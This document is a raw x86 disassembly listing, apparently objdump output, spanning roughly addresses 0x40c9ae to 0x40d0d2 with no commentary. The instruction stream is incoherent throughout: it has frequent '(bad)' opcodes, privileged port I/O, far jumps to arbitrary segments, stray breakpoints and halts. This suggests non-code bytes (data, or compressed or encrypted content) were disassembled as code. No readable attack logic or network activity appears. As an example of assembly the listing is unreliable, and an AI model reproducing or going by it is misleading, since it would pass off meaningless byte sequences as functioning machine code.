  40c9ae:	ja     0x40c9ad
  40c9b0:	leave  
  40c9b1:	jno    0x40c980
  40c9b3:	in     eax,dx
  40c9b4:	jmp    0xf25c2eb5
  40c9b9:	xchg   edi,eax
  40c9ba:	int3   
  40c9bb:	shr    edi,cl
  40c9bd:	fcmovb st,st(1)
  40c9bf:	adc    edx,edx
  40c9c1:	pushf  
  40c9c2:	test   DWORD PTR [ecx],edi
  40c9c4:	xchg   BYTE PTR es:[ebp+0x47],ah
  40c9c8:	out    dx,al
  40c9c9:	les    edx,FWORD PTR [esi+0x583c227e]
  40c9cf:	pop    edi
  40c9d0:	sbb    DWORD PTR [ebx+0x1c],edi
  40c9d3:	fcom   QWORD PTR [ecx+0x3a]
  40c9d6:	push   esi
  40c9d7:	fwait
  40c9d8:	jbe    0x40c969
  40c9da:	mov    ecx,DWORD PTR [edx-0x44]
  40c9dd:	fist   DWORD PTR [edx-0x2]
  40c9e0:	mov    edi,0xc1c5a380
  40c9e5:	js     0x40c9d4
  40c9e7:	adc    BYTE PTR [ebp-0x43a26201],cl
  40c9ed:	fstp   DWORD PTR [eax-0x57d0d9c8]
  40c9f3:	pop    ebx
  40c9f4:	dec    esp
  40c9f5:	push   ebp
  40c9f6:	data16 fld TBYTE PTR [edi-0x62]
  40c9fa:	or     DWORD PTR [eax],esi
  40c9fc:	leave  
  40c9fd:	mov    ebx,0xa6b952f4
  40ca02:	sbb    DWORD PTR [esi+0x47],0x6d951146
  40ca09:	push   0x9c71d687
  40ca0e:	jmp    0xfefa8a4
  40ca13:	shr    BYTE PTR [edx+ebx*8-0x7e],cl
  40ca17:	out    0x1f,al
  40ca19:	xchg   edx,eax
  40ca1a:	int3   
  40ca1b:	jp     0x40ca4c
  40ca1d:	stc    
  40ca1e:	or     dh,dh
  40ca20:	outs   dx,BYTE PTR ds:[esi]
  40ca21:	adc    ebx,0xbc63accd
  40ca27:	call   0xf190856d
  40ca2c:	cmp    DWORD PTR [eax+ebx*8+0xd],ebx
  40ca30:	xor    DWORD PTR [ebx],0x3831e94e
  40ca36:	xor    esi,edi
  40ca38:	pop    ss
  40ca39:	ficom  WORD PTR [esi+0x27de61eb]
  40ca3f:	mov    DWORD PTR [ebp+0x212a1b09],ebp
  40ca45:	adc    eax,0x64de9e7
  40ca4a:	jns    0x40ca2e
  40ca4c:	pop    ss
  40ca4d:	ins    BYTE PTR es:[edi],dx
  40ca4e:	repnz sbb eax,0xab9d4dac
  40ca54:	dec    esi
  40ca55:	jo     0x40ca09
  40ca57:	push   0x36
  40ca59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca5a:	mov    al,0xd8
  40ca5c:	or     edi,DWORD PTR [ebp+0x7e]
  40ca5f:	or     esi,DWORD PTR [ecx+0x1929475d]
  40ca65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca66:	mov    WORD PTR ds:0x55012684,gs
  40ca6c:	test   DWORD PTR [edx-0x16],ebx
  40ca6f:	daa    
  40ca70:	xchg   edx,eax
  40ca71:	dec    ecx
  40ca72:	pop    ds
  40ca73:	(bad)  
  40ca74:	push   edx
  40ca75:	push   ebx
  40ca76:	xor    al,0x8d
  40ca78:	pop    eax
  40ca79:	iret   
  40ca7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca7b:	(bad)  
  40ca7c:	and    ebp,ecx
  40ca7e:	xor    al,0x53
  40ca80:	js     0x40ca34
  40ca82:	push   0xfd0e5caa
  40ca87:	xor    bh,BYTE PTR [edi-0x71124875]
  40ca8d:	fs arpl bx,si
  40ca90:	data16 js 0x40ca88
  40ca93:	mov    dh,0x56
  40ca95:	or     eax,0xb50db9be
  40ca9a:	dec    esp
  40ca9b:	fst    QWORD PTR [ebp-0x30]
  40ca9e:	sbb    DWORD PTR [edi+edx*1+0x210c50ff],esp
  40caa5:	cmp    BYTE PTR [edi+ebx*4],ah
  40caa8:	ins    DWORD PTR es:[edi],dx
  40caa9:	cmp    BYTE PTR [eax+eax*2-0x2],bh
  40caad:	adc    BYTE PTR [eax-0x33],cl
  40cab0:	push   edi
  40cab1:	jmp    0x1b8a:0xc329e4e7
  40cab8:	(bad)  
  40cab9:	shl    BYTE PTR [edx-0x487870d6],cl
  40cabf:	push   es
  40cac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cac1:	lea    edx,[edx]
  40cac3:	std    
  40cac4:	enter  0x1537,0x68
  40cac8:	jmp    0xa14f:0xaf3b40c4
  40cacf:	iret   
  40cad0:	shl    DWORD PTR [esi+ecx*4],cl
  40cad3:	hlt    
  40cad4:	pop    ebp
  40cad5:	imul   esi,esi,0x7875d16a
  40cadb:	push   esp
  40cadc:	xchg   edx,eax
  40cadd:	dec    esi
  40cade:	(bad)  
  40cadf:	mov    ebx,0xc9c13cf3
  40cae4:	loope  0x40cab9
  40cae6:	imul   ecx,DWORD PTR [ebp+0xd],0x3c512a63
  40caed:	xor    al,0x27
  40caef:	xor    al,cl
  40caf1:	outs   dx,BYTE PTR ds:[esi]
  40caf2:	xchg   edx,eax
  40caf3:	jge    0x40cb06
  40caf5:	shl    cl,1
  40caf7:	xor    ecx,ebx
  40caf9:	and    al,0xb7
  40cafb:	in     al,dx
  40cafc:	fld    TBYTE PTR [ebx-0x70]
  40caff:	xor    eax,edx
  40cb01:	scas   al,BYTE PTR es:[edi]
  40cb02:	aam    0x44
  40cb04:	xchg   ecx,eax
  40cb05:	(bad)  
  40cb07:	or     ch,BYTE PTR [ebx-0x23]
  40cb0a:	into   
  40cb0b:	dec    esp
  40cb0c:	repnz retf 0x9ac1
  40cb10:	aas    
  40cb11:	loopne 0x40cb5d
  40cb13:	dec    edi
  40cb14:	jno    0x40cb52
  40cb16:	in     eax,0x61
  40cb18:	push   esi
  40cb19:	push   esi
  40cb1a:	add    DWORD PTR ds:0xbe2e950a,esp
  40cb20:	test   al,0x81
  40cb22:	ds xor al,0x9d
  40cb25:	iret   
  40cb26:	retf   
  40cb27:	jae    0x40cb66
  40cb29:	add    al,BYTE PTR [eax+0x61]
  40cb2c:	mov    ?,ecx
  40cb2e:	aas    
  40cb2f:	inc    edx
  40cb30:	rol    bh,0xd8
  40cb33:	addr16 aas 
  40cb35:	mov    esp,0x76943ec4
  40cb3a:	mov    DWORD PTR [edx],0xab74892e
  40cb40:	fdiv   DWORD PTR [ecx-0x456eb21e]
  40cb46:	mov    ebx,0xa0428183
  40cb4b:	mov    WORD PTR [eax-0x4a50b24c],ss
  40cb51:	fcmove st,st(5)
  40cb53:	and    al,0xa8
  40cb55:	(bad)  
  40cb56:	sub    al,0x5c
  40cb58:	push   0x6e
  40cb5a:	repz cld 
  40cb5c:	std    
  40cb5d:	pop    ebp
  40cb5e:	pop    ebp
  40cb5f:	mov    eax,0x7da262eb
  40cb64:	push   es
  40cb65:	iret   
  40cb66:	sbb    BYTE PTR [ebx+0x2b],dl
  40cb69:	(bad)  [edx]
  40cb6b:	adc    BYTE PTR [ecx-0x68],0x75
  40cb6f:	dec    esp
  40cb70:	adc    BYTE PTR [ebp-0x85bc9be],al
  40cb76:	add    BYTE PTR [ebp+0x72c2e86d],0x4c
  40cb7d:	pop    ss
  40cb7e:	cmp    eax,0xdf902c48
  40cb83:	test   BYTE PTR [ebp+0x74],dh
  40cb86:	std    
  40cb87:	fdivr  DWORD PTR [ebp-0x6cdb8228]
  40cb8d:	jge    0x40cbe5
  40cb8f:	sub    al,0xfd
  40cb91:	adc    ebp,0xfffffffc
  40cb94:	je     0x40cbd8
  40cb96:	in     al,0xd2
  40cb98:	or     eax,esi
  40cb9a:	add    DWORD PTR [ebx+0x3c50ed0e],eax
  40cba0:	push   0xffffff91
  40cba2:	test   al,0xdc
  40cba4:	and    ah,BYTE PTR [edx+0x16]
  40cba7:	test   BYTE PTR [edi-0x42],ah
  40cbaa:	push   esp
  40cbab:	mov    dl,0x5
  40cbad:	and    al,0x72
  40cbaf:	(bad)  
  40cbb0:	lock std 
  40cbb2:	mov    al,ah
  40cbb4:	je     0x40cc2f
  40cbb6:	sub    BYTE PTR [edx],ah
  40cbb8:	fwait
  40cbb9:	out    dx,eax
  40cbba:	xor    DWORD PTR [ebx+0x26],ecx
  40cbbd:	inc    ebp
  40cbbe:	adc    al,0xc6
  40cbc0:	sub    edx,DWORD PTR [ebp-0x5c]
  40cbc3:	inc    ebp
  40cbc4:	pusha  
  40cbc5:	aaa    
  40cbc6:	stos   DWORD PTR es:[edi],eax
  40cbc7:	arpl   WORD PTR [ebp-0x25daead4],bp
  40cbcd:	pushf  
  40cbce:	or     BYTE PTR [esi-0x7a],bl
  40cbd1:	call   0xfabc5f0d
  40cbd6:	sbb    dl,BYTE PTR [edx]
  40cbd8:	or     dh,BYTE PTR [eax+0x6c]
  40cbdb:	jg     0x40cbe7
  40cbdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbde:	mov    al,ds:0x342148ff
  40cbe3:	fwait
  40cbe4:	test   DWORD PTR [edx],ecx
  40cbe6:	ins    DWORD PTR es:[edi],dx
  40cbe7:	inc    esp
  40cbe8:	jg     0x40cbdb
  40cbea:	sar    DWORD PTR [ebx+0x21],1
  40cbed:	jae    0x40cbde
  40cbef:	ja     0x40cbed
  40cbf1:	cwde   
  40cbf2:	jl     0x40cc6e
  40cbf4:	sbb    DWORD PTR [esi+0x22],esi
  40cbf7:	inc    esi
  40cbf8:	adc    BYTE PTR [eax-0x6ba97817],0xba
  40cbff:	adc    al,BYTE PTR [esi]
  40cc01:	clc    
  40cc02:	dec    edx
  40cc03:	push   ecx
  40cc04:	loopne 0x40cb97
  40cc06:	add    al,0xca
  40cc08:	sub    al,0xfc
  40cc0a:	lods   al,BYTE PTR ds:[esi]
  40cc0b:	xor    eax,DWORD PTR [ebx]
  40cc0d:	arpl   WORD PTR [edi-0x3c71cf78],dx
  40cc13:	ret    
  40cc14:	ret    0x9cd0
  40cc17:	mov    edi,DWORD PTR [ecx]
  40cc19:	jmp    0xbcc3b522
  40cc1e:	cdq    
  40cc1f:	lods   eax,DWORD PTR ds:[esi]
  40cc20:	adc    DWORD PTR ds:0x8e737319,esi
  40cc26:	int3   
  40cc27:	les    edi,FWORD PTR [edi+eiz*8]
  40cc2a:	into   
  40cc2b:	add    al,0xff
  40cc2d:	push   es
  40cc2e:	jmp    0x60da:0x1ff65284
  40cc35:	repz mov cl,0x4b
  40cc38:	pushf  
  40cc39:	in     al,dx
  40cc3a:	xchg   ecx,eax
  40cc3b:	nop
  40cc3c:	fdiv   DWORD PTR [eax-0x532085bb]
  40cc42:	xor    edi,esi
  40cc44:	mov    al,0x94
  40cc46:	daa    
  40cc47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc48:	push   ebx
  40cc49:	lock lahf 
  40cc4b:	scas   al,BYTE PTR es:[edi]
  40cc4c:	adc    al,0x2f
  40cc4e:	inc    esi
  40cc4f:	(bad)  
  40cc50:	and    ah,BYTE PTR [ebp+0x5fb68f51]
  40cc56:	dec    esp
  40cc57:	loope  0x40cc11
  40cc59:	jmp    0x898a:0x43e391e0
  40cc60:	das    
  40cc61:	outs   dx,DWORD PTR ds:[esi]
  40cc62:	les    esp,FWORD PTR [ecx]
  40cc64:	daa    
  40cc65:	js     0x40cccd
  40cc67:	push   cs
  40cc68:	arpl   cx,di
  40cc6a:	mov    ch,0x98
  40cc6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc6d:	jl     0x40cc93
  40cc6f:	jae    0x40ccbd
  40cc71:	(bad)
  40cc74:	dec    esi
  40cc75:	in     al,dx
  40cc76:	xchg   esi,eax
  40cc77:	cmp    cl,BYTE PTR [edx]
  40cc79:	and    BYTE PTR [ebp+0x7c9baecc],cl
  40cc7f:	push   edx
  40cc80:	pop    edi
  40cc81:	jmp    0x6c7a887e
  40cc86:	jb     0x40cc47
  40cc88:	test   al,0x64
  40cc8a:	adc    esi,esi
  40cc8c:	aad    0xa3
  40cc8e:	(bad)  
  40cc90:	adc    bl,BYTE PTR [eax-0x3162d519]
  40cc96:	es jbe 0x40cd06
  40cc99:	mov    bh,0x67
  40cc9b:	xchg   ebx,eax
  40cc9c:	mov    edx,0x8bc996e
  40cca1:	sub    BYTE PTR [ebp-0x78],ah
  40cca4:	mov    ds:0x97bf14fc,eax
  40cca9:	sbb    BYTE PTR [edx+0x7fab4e66],ah
  40ccaf:	dec    ebp
  40ccb0:	(bad)  
  40ccb2:	mov    dl,BYTE PTR [ebx+ebx*8+0x2a]
  40ccb6:	call   FWORD PTR [edi-0x751d4ed5]
  40ccbc:	pusha  
  40ccbd:	int3   
  40ccbe:	test   BYTE PTR [edx],ah
  40ccc0:	call   0xf6d21dd8
  40ccc5:	push   eax
  40ccc6:	sbb    bh,BYTE PTR [eax-0x4b]
  40ccc9:	mov    bh,0xfe
  40cccb:	sbb    DWORD PTR [ebp+ebp*2-0xc],esp
  40cccf:	xchg   ecx,eax
  40ccd0:	adc    al,0x2
  40ccd2:	sub    ebp,ecx
  40ccd4:	rcl    DWORD PTR [edi-0x535b3b6b],0xfc
  40ccdb:	push   edi
  40ccdc:	ret    0x5584
  40ccdf:	jns    0x40cce9
  40cce1:	xchg   esi,eax
  40cce2:	jnp    0x40ccda
  40cce4:	into   
  40cce5:	into   
  40cce6:	lods   eax,DWORD PTR ds:[esi]
  40cce7:	xor    al,0x11
  40cce9:	shr    ebx,cl
  40cceb:	dec    eax
  40ccec:	int3   
  40cced:	xchg   DWORD PTR [ebx],esi
  40ccef:	retf   
  40ccf0:	pop    edi
  40ccf1:	lods   eax,DWORD PTR ds:[esi]
  40ccf2:	addr16 ret 
  40ccf4:	cmp    al,0xaf
  40ccf6:	daa    
  40ccf7:	add    al,ch
  40ccf9:	adc    BYTE PTR [esi-0x19],ah
  40ccfc:	scas   al,BYTE PTR es:[edi]
  40ccfd:	popa   
  40ccfe:	sbb    bh,BYTE PTR [ecx+0x2e935dc9]
  40cd04:	jne    0x40cd26
  40cd06:	pop    edi
  40cd07:	loop   0x40cd86
  40cd09:	add    BYTE PTR [edi],bl
  40cd0b:	push   0xffffffee
  40cd0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd0e:	fdivr  st(3),st
  40cd10:	add    al,0xd3
  40cd12:	repnz mov esp,0x38d96b28
  40cd18:	mov    ds:0xcb1a49fa,al
  40cd1d:	pop    es
  40cd1e:	or     edi,ebx
  40cd20:	stc    
  40cd21:	xchg   edi,eax
  40cd22:	push   0x3b4874ec
  40cd27:	int    0x70
  40cd29:	or     BYTE PTR [edi-0x7695f02d],dh
  40cd2f:	(bad)  
  40cd30:	mov    esp,0x8f0b0bc5
  40cd35:	scas   eax,DWORD PTR es:[edi]
  40cd36:	repz sub eax,DWORD PTR [ecx-0x75]
  40cd3a:	int    0x69
  40cd3c:	repz inc ebp
  40cd3e:	(bad)  
  40cd3f:	pop    ebx
  40cd40:	mov    DWORD PTR [ebx-0x1a31b35c],edx
  40cd46:	in     al,dx
  40cd47:	shl    BYTE PTR [edx+0x5e],1
  40cd4a:	xchg   al,al
  40cd4c:	mov    eax,0x85f2cd56
  40cd51:	dec    edx
  40cd52:	mov    edi,0x6a30697e
  40cd57:	and    BYTE PTR ds:0xfb9e37b2,bl
  40cd5d:	cdq    
  40cd5e:	lods   eax,DWORD PTR ds:[esi]
  40cd5f:	pop    edx
  40cd60:	sbb    bl,BYTE PTR [edi+0x4]
  40cd63:	jmp    0x1f119b93
  40cd68:	aam    0x6a
  40cd6a:	mov    dl,0xc0
  40cd6c:	inc    ecx
  40cd6d:	push   esp
  40cd6e:	push   esp
  40cd6f:	jae    0x40cdc7
  40cd71:	or     BYTE PTR [ebp+0x28],0x5
  40cd75:	sar    DWORD PTR [esi],0xcd
  40cd78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd79:	in     al,dx
  40cd7a:	xchg   esi,eax
  40cd7b:	jb     0x40ccff
  40cd7d:	(bad)
  40cd81:	pop    esp
  40cd82:	inc    ebx
  40cd83:	leave  
  40cd84:	dec    edx
  40cd85:	jl     0x40cd33
  40cd87:	idiv   DWORD PTR [edx-0x62]
  40cd8a:	xor    ax,0x54ae
  40cd8e:	or     eax,0xc46a03a1
  40cd93:	les    ecx,FWORD PTR [edx+0x28bb0610]
  40cd99:	leave  
  40cd9a:	jmp    0x822c:0x4ff976cd
  40cda1:	je     0x40cdcf
  40cda3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cda4:	and    BYTE PTR [ebx],ah
  40cda6:	mov    ebx,0xe604a71e
  40cdab:	inc    ebp
  40cdac:	add    DWORD PTR [eax+ebp*1],esp
  40cdaf:	jle    0x40cdf3
  40cdb1:	lods   al,BYTE PTR ds:[esi]
  40cdb2:	fidivr WORD PTR ds:0xdeab779d
  40cdb8:	lds    edx,FWORD PTR [esi-0x42]
  40cdbb:	dec    edi
  40cdbc:	mov    esp,0xa3cd13f6
  40cdc1:	cmp    DWORD PTR [edx],esi
  40cdc3:	jmp    0xdc84c2d8
  40cdc8:	aad    0x41
  40cdca:	cmp    al,0x89
  40cdcc:	das    
  40cdcd:	mov    dl,0xa1
  40cdcf:	xchg   ebx,eax
  40cdd0:	pop    edi
  40cdd1:	pop    edx
  40cdd2:	idiv   BYTE PTR [eax+ebp*2]
  40cdd5:	add    eax,0x1445084b
  40cdda:	leave  
  40cddb:	jmp    0x40ce5c
  40cddd:	nop
  40cdde:	push   edi
  40cddf:	jno    0x40cdfb
  40cde1:	fld    DWORD PTR [ebp+0x73]
  40cde4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cde5:	arpl   WORD PTR [ebx],ax
  40cde7:	mov    ebx,0x405e9457
  40cdec:	jg     0x40ce2d
  40cdee:	xor    BYTE PTR [ebx+0x1f79ca69],ch
  40cdf4:	xor    al,0x82
  40cdf6:	sub    edx,DWORD PTR [ebx]
  40cdf8:	inc    ebp
  40cdf9:	and    BYTE PTR [ecx-0x767a2972],bh
  40cdff:	cmp    eax,0xed133d7a
  40ce04:	mov    bl,0x5f
  40ce06:	mov    al,0xc2
  40ce08:	mov    esi,0x54139724
  40ce0d:	cmp    al,0x2a
  40ce0f:	mov    WORD PTR [ebx+edx*8+0x6b],fs
  40ce13:	outs   dx,DWORD PTR ds:[esi]
  40ce14:	inc    edx
  40ce15:	mov    bh,0x19
  40ce17:	inc    ebx
  40ce18:	sub    BYTE PTR ds:0x6b5c316b,al
  40ce1e:	jl     0x40cde9
  40ce20:	xor    eax,0x290293f9
  40ce25:	sti    
  40ce26:	pop    edx
  40ce27:	loopne 0x40cdad
  40ce29:	cmp    DWORD PTR cs:[esi-0x69a9a1b4],esi
  40ce30:	xchg   ebp,eax
  40ce31:	inc    esp
  40ce32:	retf   0x248b
  40ce35:	xchg   edx,eax
  40ce36:	xchg   ebp,eax
  40ce37:	dec    esp
  40ce38:	aam    0x5d
  40ce3a:	mov    ebx,ds
  40ce3c:	cmp    edx,edx
  40ce3e:	cmp    BYTE PTR [esi-0x127989cf],0x7f
  40ce45:	sub    DWORD PTR [ebp+eiz*2+0x5f010946],esp
  40ce4c:	lods   eax,DWORD PTR ds:[esi]
  40ce4d:	outs   dx,DWORD PTR ds:[esi]
  40ce4e:	xchg   ecx,eax
  40ce4f:	jge    0x40cea3
  40ce51:	jp     0x40ce4f
  40ce53:	push   esi
  40ce54:	inc    ebp
  40ce55:	mov    eax,0x2c1ec395
  40ce5a:	lods   eax,DWORD PTR ds:[esi]
  40ce5b:	inc    esp
  40ce5c:	jge    0x40ce54
  40ce5e:	xchg   edx,eax
  40ce5f:	jp     0x40ce20
  40ce61:	xor    eax,0xa771c589
  40ce66:	lea    ebx,[eax]
  40ce68:	fistp  QWORD PTR [eax]
  40ce6a:	mov    ebp,0xf30b7d75
  40ce6f:	jb     0x40ce65
  40ce71:	xor    al,bh
  40ce73:	lods   al,BYTE PTR ds:[esi]
  40ce74:	(bad)  
  40ce75:	push   edi
  40ce76:	push   esp
  40ce77:	sahf   
  40ce78:	jns    0x40ce9f
  40ce7a:	inc    ebp
  40ce7b:	jmp    0x40ce76
  40ce7d:	test   DWORD PTR [esi+eiz*2+0x48d01e1e],ebp
  40ce84:	add    DWORD PTR [ebx+ebp*1+0x2b47f3f2],ecx
  40ce8b:	mov    DWORD PTR [edx-0x6c],esi
  40ce8e:	in     al,dx
  40ce8f:	xor    DWORD PTR [edi],0xb3d7d005
  40ce95:	daa    
  40ce96:	and    ch,BYTE PTR [ebx-0x1424c389]
  40ce9c:	jmp    0x40ce5f
  40ce9e:	aas    
  40ce9f:	push   ds
  40cea0:	mov    ds:0x9cbb076b,al
  40cea5:	adc    al,0xfa
  40cea7:	jb     0x40cea1
  40cea9:	adc    BYTE PTR [ebp-0x21133810],al
  40ceaf:	sti    
  40ceb0:	into   
  40ceb1:	loopne 0x40ce80
  40ceb3:	fcomp  DWORD PTR [ecx+0x658bf761]
  40ceb9:	add    eax,0xcac978cb
  40cebe:	jmp    0xdea916e
  40cec3:	pop    ss
  40cec4:	retf   
  40cec5:	or     DWORD PTR [ebx+0x93a1761],ebp
  40cecb:	add    eax,0xfdcfae6b
  40ced0:	or     al,0xcb
  40ced2:	xchg   BYTE PTR ds:0x2e6c0d10,ch
  40ced8:	das    
  40ced9:	dec    ebp
  40ceda:	jbe    0x40ce86
  40cedc:	jbe    0x40ce96
  40cede:	shl    esp,1
  40cee0:	repz mov al,0xb
  40cee3:	add    BYTE PTR [eax-0x4f],dl
  40cee6:	sub    cl,cl
  40cee8:	(bad)  
  40cee9:	out    dx,eax
  40ceea:	mov    dh,0xb7
  40ceec:	inc    ebx
  40ceed:	mov    cl,0x38
  40ceef:	mov    bl,0x8e
  40cef1:	repnz cmp eax,0x6e0096b7
  40cef7:	mov    ds:0x20c88551,eax
  40cefc:	push   eax
  40cefd:	pop    eax
  40cefe:	cmp    al,0x59
  40cf00:	mov    edi,ebx
  40cf02:	clc    
  40cf03:	mov    al,ds:0x65669c95
  40cf08:	and    bl,dh
  40cf0a:	shl    BYTE PTR [edi-0x6e],cl
  40cf0d:	scas   eax,DWORD PTR es:[edi]
  40cf0e:	inc    eax
  40cf0f:	pop    eax
  40cf10:	hlt    
  40cf11:	ins    DWORD PTR es:[edi],dx
  40cf12:	adc    BYTE PTR [esi-0x39],dh
  40cf15:	xor    esi,DWORD PTR [ecx+0x43]
  40cf18:	xlat   BYTE PTR ds:[ebx]
  40cf19:	or     bh,dh
  40cf1b:	inc    esi
  40cf1c:	pop    esi
  40cf1d:	js     0x40cf12
  40cf1f:	or     ebp,DWORD PTR [edx-0x5daf12cb]
  40cf25:	push   esp
  40cf26:	jo     0x40cf43
  40cf28:	in     al,0x70
  40cf2a:	or     DWORD PTR [esi-0x80],0xe0a33508
  40cf31:	div    BYTE PTR [ecx+0x3c97edbd]
  40cf37:	repnz mov es,ecx
  40cf3a:	cld    
  40cf3b:	test   DWORD PTR [eax-0x26],esp
  40cf3e:	adc    dl,0xd8
  40cf41:	pop    esi
  40cf42:	and    bh,BYTE PTR [eax-0x27]
  40cf45:	inc    ebx
  40cf46:	outs   dx,BYTE PTR ds:[esi]
  40cf47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf48:	pop    edx
  40cf49:	adc    eax,0x78b02cac
  40cf4e:	addr16 mov edi,0xadada2c8
  40cf54:	sti    
  40cf55:	or     dh,BYTE PTR [esi+0x35]
  40cf58:	fisub  WORD PTR ds:0x6e6b6259
  40cf5e:	in     eax,dx
  40cf5f:	fstp   TBYTE PTR [edi-0x62]
  40cf62:	and    BYTE PTR [ebp+0x6bbc3815],ah
  40cf68:	sub    ah,al
  40cf6a:	lods   al,BYTE PTR ds:[esi]
  40cf6b:	aaa    
  40cf6c:	ret    
  40cf6d:	fist   WORD PTR [ebp+0x4e]
  40cf70:	cmp    al,0xc2
  40cf72:	jne    0x40cff2
  40cf74:	pop    ds
  40cf75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf76:	cmp    al,0x6a
  40cf78:	stos   DWORD PTR es:[edi],eax
  40cf79:	mov    eax,fs
  40cf7b:	out    0xe7,al
  40cf7d:	hlt    
  40cf7e:	dec    ecx
  40cf7f:	pop    ecx
  40cf80:	test   al,0x41
  40cf82:	loopne 0x40cffe
  40cf84:	pushfw 
  40cf86:	imul   edx,DWORD PTR [eax-0x5f],0xa359d86f
  40cf8d:	jbe    0x40cfcc
  40cf8f:	sub    esi,DWORD PTR [ebx]
  40cf91:	inc    ebp
  40cf92:	inc    ecx
  40cf93:	jmp    0x4df:0xc15338b3
  40cf9a:	shl    eax,0xba
  40cf9d:	jns    0x40cf48
  40cf9f:	ins    BYTE PTR es:[edi],dx
  40cfa0:	or     BYTE PTR [ecx],cl
  40cfa2:	and    al,0x11
  40cfa4:	mov    ebp,0x8496fab8
  40cfa9:	inc    ebp
  40cfaa:	mov    eax,ds:0x30714263
  40cfaf:	xchg   ebp,eax
  40cfb0:	cmp    DWORD PTR [ecx],ebp
  40cfb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfb3:	inc    esi
  40cfb4:	pop    edi
  40cfb5:	mov    bl,0x5e
  40cfb7:	stc    
  40cfb8:	loopne 0x40d036
  40cfba:	rol    DWORD PTR [edi-0x79],0xf7
  40cfbe:	jns    0x40cfa3
  40cfc0:	rol    esi,cl
  40cfc2:	test   DWORD PTR [ebx+ebp*4-0x52],edx
  40cfc6:	cmp    dh,BYTE PTR [ebx-0x4d]
  40cfc9:	je     0x40cf87
  40cfcb:	in     al,dx
  40cfcc:	and    bh,ch
  40cfce:	pushf  
  40cfcf:	dec    ecx
  40cfd0:	pop    ebp
  40cfd1:	mov    ecx,0x5fca871a
  40cfd6:	jg     0x40cf96
  40cfd8:	add    ecx,ecx
  40cfda:	jmp    0x40cf67
  40cfdc:	add    eax,0xeafd6244
  40cfe1:	mov    edx,0xeb5f59e8
  40cfe6:	mov    al,ds:0xbf68b9d8
  40cfeb:	in     al,0x8d
  40cfed:	or     BYTE PTR [ebx-0x7a259d2a],cl
  40cff3:	cmc    
  40cff4:	mov    ah,0xbf
  40cff6:	and    eax,0x54b4f696
  40cffb:	loope  0x40d055
  40cffd:	sub    al,0x54
  40cfff:	popfw  
  40d001:	sbb    DWORD PTR [ebp+0x34],ebp
  40d004:	adc    eax,0x3e5e150c
  40d009:	cs mov dh,0x72
  40d00c:	fimul  DWORD PTR [ebp+0x60877fcc]
  40d012:	in     al,dx
  40d013:	sub    ebp,DWORD PTR [edx-0x70]
  40d016:	push   ebx
  40d017:	dec    BYTE PTR ds:[ecx-0x47]
  40d01b:	jp     0x40d04b
  40d01d:	pop    ss
  40d01e:	and    cl,bl
  40d020:	es retf 
  40d022:	or     dh,ch
  40d024:	lds    esi,FWORD PTR [edi+0x77]
  40d027:	fstp   TBYTE PTR [edi]
  40d029:	daa    
  40d02a:	cmc    
  40d02b:	ss clc 
  40d02d:	in     eax,dx
  40d02e:	out    dx,al
  40d02f:	sbb    al,ah
  40d031:	adc    al,0xb7
  40d033:	push   ds
  40d034:	les    eax,FWORD PTR ds:0x4e78c4de
  40d03a:	xor    DWORD PTR [ebp+edx*8+0x63428450],ebp
  40d041:	(bad)  
  40d042:	sti    
  40d043:	sub    DWORD PTR [ebp+0x74],edi
  40d046:	call   0x8ab144ec
  40d04b:	ror    BYTE PTR [eax],0xb1
  40d04e:	or     dl,ah
  40d050:	dec    esi
  40d051:	dec    ebp
  40d052:	fwait
  40d053:	or     DWORD PTR [edx+0x10],ebp
  40d056:	jns    0x40d02a
  40d058:	or     ebx,DWORD PTR [esp+esi*4]
  40d05b:	ja     0x40d0bc
  40d05d:	seto   BYTE PTR [ecx+0x6d4d300c]
  40d064:	push   ds
  40d065:	dec    esp
  40d066:	cmp    al,0x6b
  40d068:	and    BYTE PTR cs:[eax-0x43399e7c],bh
  40d06f:	sub    al,0xfc
  40d071:	xchg   ecx,eax
  40d072:	ret    
  40d073:	scas   al,BYTE PTR es:[edi]
  40d074:	adc    eax,0x23e6be3b
  40d079:	mov    ds:0xcd1c4c0b,eax
  40d07e:	jo     0x40d09f
  40d080:	dec    edx
  40d081:	lea    ebp,[bx-0x48]
  40d085:	loop   0x40d0ca
  40d087:	jae    0x40d0c9
  40d089:	xchg   edi,eax
  40d08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d08b:	sbb    al,0x6e
  40d08d:	out    dx,eax
  40d08e:	popf   
  40d08f:	cmp    BYTE PTR [ecx],dl
  40d091:	out    dx,eax
  40d092:	jmp    0xb751459b
  40d097:	or     DWORD PTR [ebp+0x5e403ad],esi
  40d09d:	push   edx
  40d09e:	mov    ah,bh
  40d0a0:	inc    esp
  40d0a1:	and    DWORD PTR [ebx],edi
  40d0a3:	shr    dh,cl
  40d0a5:	dec    edx
  40d0a6:	js     0x40d10c
  40d0a8:	mov    eax,0xdc364e58
  40d0ad:	lea    esi,[esi-0x4d39e47d]
  40d0b3:	cmp    al,0x63
  40d0b5:	and    esp,DWORD PTR [edx-0x46]
  40d0b8:	adc    BYTE PTR [edx+0x1c],bh
  40d0bb:	js     0x40d0a2
  40d0bd:	xor    al,0x7f
  40d0bf:	out    dx,al
  40d0c0:	fld    DWORD PTR [ecx]
  40d0c2:	out    0x6b,eax
  40d0c4:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0c6:	test   al,0x7
  40d0c8:	pop    esi
  40d0c9:	or     al,ch
  40d0cb:	inc    esp
  40d0cc:	addr16 (bad) 
  40d0ce:	pop    ds
  40d0cf:	pop    ds
  40d0d0:	(bad)  
  40d0d1:	sahf   
  40d0d2:	inc    edx
